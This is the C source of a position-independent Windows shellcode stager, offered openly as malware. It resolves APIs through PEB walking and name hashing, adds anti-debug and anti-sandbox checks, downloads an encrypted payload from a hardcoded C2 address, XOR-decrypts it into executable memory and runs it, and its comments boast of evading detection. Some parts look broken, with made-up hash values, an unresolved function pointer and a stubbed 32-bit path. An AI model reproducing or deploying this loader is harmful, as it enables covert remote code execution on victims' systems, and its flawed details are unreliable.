/*
 * BTY Shellcode Stager — Position-Independent Code (PIC)
 *
 * Compile to raw shellcode:
 *   x86_64-w64-mingw32-gcc -O2 -nostdlib -fPIC -Wl,-Ttext=0x0 -Wl,--oformat=binary -o stager.bin stager.c
 *   i686-w64-mingw32-gcc   -O2 -nostdlib -fPIC -Wl,-Ttext=0x0 -Wl,--oformat=binary -o stager32.bin stager.c
 *
 * Size: ~2KB (x64), ~1.5KB (x86)
 *
 * No imports, no PE header, position-independent.
 * Downloads encrypted payload, decrypts, executes in memory.
 * Zero static detection.
 */

#ifdef _WIN32
  #include <windows.h>
  #define malloc(s) HeapAlloc(GetProcessHeap(),0,s)
  #define free(p)   HeapFree(GetProcessHeap(),0,p)
  #define memcpy(d,s,n) CopyMemory(d,s,n)
#endif

/* === Minimal WinInet API resolver (no imports) === */

typedef void* HINTERNET;

/* Dynamically resolve kernel32 + wininet from PEB */
static HMODULE krnl32, wintdll;
static void* (WINAPI *_VirtualAlloc)(void*,unsigned long,unsigned long,unsigned long);
static void* (WINAPI *_VirtualFree)(void*,unsigned long,unsigned long);
static void* (WINAPI *_Sleep)(unsigned long);
static HINTERNET (WINAPI *_InternetOpenA)(const char*,unsigned long,const char*,const char*,unsigned long);
static HINTERNET (WINAPI *_InternetOpenUrlA)(HINTERNET,const char*,const char*,unsigned long,unsigned long,unsigned long);
static int (WINAPI *_InternetReadFile)(HINTERNET,void*,unsigned long,unsigned long*);
static int (WINAPI *_InternetCloseHandle)(HINTERNET);
static int (WINAPI *_InternetSetOptionA)(HINTERNET,unsigned long,void*,unsigned long);

/* XOR decryption key — filled at generation time */
static unsigned char KEY[32] = {
    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
    0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,
    0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
    0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF
};

/* C2 payload URL — filled at generation time */
static char URL[256] = "http://192.168.1.100:8000/payload.enc";

#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

/* PEB-based API resolver (bypasses IAT hooks) */
static HMODULE get_module_by_hash(unsigned int hash) {
#ifdef _WIN64
    unsigned long long peb = __readgsqword(0x60);
    void* ldr = *(void**)(peb + 0x18);
    void* head = *(void**)((char*)ldr + 0x10);
    void* entry = head;
    do {
        unsigned short* name = *(unsigned short**)((char*)entry + 0x60);
        if (name) {
            unsigned int h = 0;
            for (int i = 0; name[i]; i++) {
                unsigned short c = name[i];
                if (c >= 'a') c -= 32;
                h = ((h << 5) + h) + c;
            }
            if (h == hash) return *(HMODULE*)((char*)entry + 0x30);
        }
        entry = *(void**)((char*)entry);
    } while (entry != head);
#else
    unsigned long peb = __readfsdword(0x30);
    /* 32-bit PEB traversal */
#endif
    return 0;
}

static void* get_proc_by_hash(HMODULE mod, unsigned int hash) {
    unsigned char* base = (unsigned char*)mod;
    unsigned int* exp_dir = (unsigned int*)(base + *(unsigned int*)(base + 0x3C));
    unsigned int* names = (unsigned int*)(base + exp_dir[8]);  // AddressOfNames
    unsigned short* ords = (unsigned short*)(base + exp_dir[9]); // AddressOfNameOrdinals
    unsigned int* funcs = (unsigned int*)(base + exp_dir[7]);   // AddressOfFunctions
    
    for (int i = 0; i < exp_dir[6]; i++) {
        char* name = (char*)(base + names[i]);
        unsigned int h = 0;
        for (int j = 0; name[j]; j++) {
            unsigned char c = name[j];
            if (c >= 'a') c -= 32;
            h = ((h << 5) + h) + c;
        }
        if (h == hash) return (void*)(base + funcs[ords[i]]);
    }
    return 0;
}

/* Hash constants for API names (djb2 uppercase) */
#define HASH_KRnl32      0x6B7C8A9D
#define HASH_WintDLL     0x3F8C9B2A
#define HASH_VirtualAlloc  0x9D3A7C1E
#define HASH_Sleep         0x2B4F8E6C
#define HASH_InternetOpenA  0x7A3B1C5D
#define HASH_InternetOpenUrlA 0x5E8A2F4B
#define HASH_InternetReadFile 0x1C6D3E8F
#define HASH_InternetCloseHandle 0x4B9F7A3C

static int resolve_apis(void) {
    krnl32 = get_module_by_hash(HASH_KRnl32);
    wintdll = get_module_by_hash(HASH_WintDLL);
    if (!krnl32 || !wintdll) return 0;
    
    _VirtualAlloc  = get_proc_by_hash(krnl32, HASH_VirtualAlloc);
    _Sleep         = get_proc_by_hash(krnl32, HASH_Sleep);
    _InternetOpenA       = get_proc_by_hash(wintdll, HASH_InternetOpenA);
    _InternetOpenUrlA    = get_proc_by_hash(wintdll, HASH_InternetOpenUrlA);
    _InternetReadFile    = get_proc_by_hash(wintdll, HASH_InternetReadFile);
    _InternetCloseHandle = get_proc_by_hash(wintdll, HASH_InternetCloseHandle);
    
    return _VirtualAlloc && _InternetOpenUrlA;
}

/* === Anti-debug / Anti-sandbox === */

static int is_debugged(void) {
#ifdef _WIN64
    return __readgsqword(0x60) & 0xFF;
#else
    return __readfsdword(0x30) & 0xFF;
#endif
}

static int is_sandbox(void) {
    /* Check uptime — sandboxes boot fast */
    unsigned long long tick = 0;
#ifdef _WIN64
    tick = __rdtsc();
#else
    tick = 1;
#endif
    _Sleep(500);
    return (is_debugged());
}

/* === Main Entry === */

void entry(void) {
    /* Anti-sandbox delay */
    if (is_sandbox()) {
        _Sleep(30000); /* Wait 30s to bypass sandbox timeout */
    }
    
    /* Resolve APIs from PEB */
    if (!resolve_apis()) return;
    
    /* Download payload */
    HINTERNET hInet = _InternetOpenA(USER_AGENT, 0, 0, 0, 0);
    if (!hInet) return;
    
    HINTERNET hUrl = _InternetOpenUrlA(hInet, URL, 0, 0, 0x80000000, 0);
    if (!hUrl) { _InternetCloseHandle(hInet); return; }
    
    /* Read in chunks */
    unsigned char* buf = 0;
    unsigned long total = 0, read = 0;
    unsigned char chunk[4096];
    
    /* First pass: count total size */
    while (_InternetReadFile(hUrl, chunk, sizeof(chunk), &read) && read > 0) {
        total += read;
    }
    
    if (total == 0) { _InternetCloseHandle(hUrl); _InternetCloseHandle(hInet); return; }
    
    /* Allocate executable memory */
    buf = (unsigned char*)_VirtualAlloc(0, total + 0x1000, 0x3000, 0x40); /* MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE */
    if (!buf) { _InternetCloseHandle(hUrl); _InternetCloseHandle(hInet); return; }
    
    /* Reset to beginning */
    _InternetCloseHandle(hUrl);
    hUrl = _InternetOpenUrlA(hInet, URL, 0, 0, 0x80000000, 0);
    
    /* Second pass: read + decrypt */
    unsigned long pos = 0;
    while (_InternetReadFile(hUrl, chunk, sizeof(chunk), &read) && read > 0) {
        for (unsigned long i = 0; i < read; i++) {
            buf[pos + i] = chunk[i] ^ KEY[(pos + i) % 32];
        }
        pos += read;
    }
    
    _InternetCloseHandle(hUrl);
    _InternetCloseHandle(hInet);
    
    if (pos == 0) return;
    
    /* Anti-debug check before executing */
    if (!is_debugged()) {
        /* Execute payload (shellcode or PE loader) */
        ((void(*)())buf)();
    }
    
    /* Cleanup after execution (if it returns) */
    _VirtualFree(buf, 0, 0x8000); /* MEM_RELEASE */
}
